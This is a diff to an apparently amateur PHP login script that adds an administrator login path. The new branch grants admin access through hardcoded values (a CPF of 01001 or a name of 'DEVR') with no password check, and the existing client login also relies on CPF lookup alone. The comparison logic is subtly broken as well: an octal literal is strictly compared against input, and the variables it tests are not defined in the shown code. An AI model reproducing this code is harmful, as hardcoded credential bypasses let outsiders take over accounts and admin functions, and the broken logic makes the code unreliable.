@@ -4,6 +4,7 @@
 
 
 require '../App/Entity/Cliente.php';
+require '../App/Entity/Administrador.php';
 require '../App/Session/Login.php';
 
 Login::requireLogout();
@@ -20,15 +21,22 @@ if (isset($_POST['logar'])){
         // Verificar se exite usuario com esse email no banco
         $cliente = Cliente::getUsuarioPorCpf($_POST['cpf']);
 
-    
-        
-        // Verifica se exite usuario com essa senha no banco
-        if(!$cliente instanceof Cliente){
-            $alertaLogin = 'Nome ou CPF Inválidos';
-        }else{
-               // Loga usuario
-            Login::login($cliente);
+        $adm = Administrador::getAdmPorCpf($_POST['cpf']);
+
+
+        if ($cpf === 01001 || $nome === "DEVR") {
+            Login::loginADM($adm);
+        } else {
+            // Verifica se existe usuário com essa senha no banco
+            if (!$cliente instanceof Cliente) {
+                $alertaLogin = 'Nome ou CPF Inválidos';
+            } else {
+                // Loga usuário
+                Login::login($cliente);
+            }
         }
+        
+
 
 
     }
